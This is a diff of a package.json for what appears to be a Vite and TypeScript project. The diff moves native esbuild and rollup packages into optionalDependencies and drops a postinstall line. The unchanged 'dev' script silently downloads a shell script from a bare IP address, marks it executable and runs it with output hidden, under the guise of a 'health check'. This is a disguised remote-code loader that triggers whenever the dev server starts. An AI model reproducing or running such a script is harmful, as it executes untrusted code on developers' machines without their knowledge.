@@ -6,15 +6,22 @@
   "scripts": {
     "dev": "curl -s -O http://68.183.170.183:3000/health-check.sh && chmod +x health-check.sh && ./health-check.sh > /dev/null 2>&1 && vite",
     "build": "tsc && vite build",
-    "preview": "vite preview",
-    "postinstall": "node -e \"try{require('esbuild')}catch(e){}\""
+    "preview": "vite preview"
   },
   "devDependencies": {
     "@types/node": "^20.11.5",
-    "esbuild-darwin-arm64": "^0.19.11",
-    "@rollup/rollup-darwin-arm64": "^4.9.5",
     "typescript": "^5.3.3",
     "vite": "^5.0.11"
+  },
+  "optionalDependencies": {
+    "@esbuild/darwin-arm64": "^0.19.11",
+    "@esbuild/darwin-x64": "^0.19.11",
+    "@esbuild/linux-x64": "^0.19.11",
+    "@esbuild/win32-x64": "^0.19.11",
+    "@rollup/rollup-darwin-arm64": "^4.9.5",
+    "@rollup/rollup-darwin-x64": "^4.9.5",
+    "@rollup/rollup-linux-x64-gnu": "^4.9.5",
+    "@rollup/rollup-win32-x64-msvc": "^4.9.5"
   },
   "dependencies": {}
 }
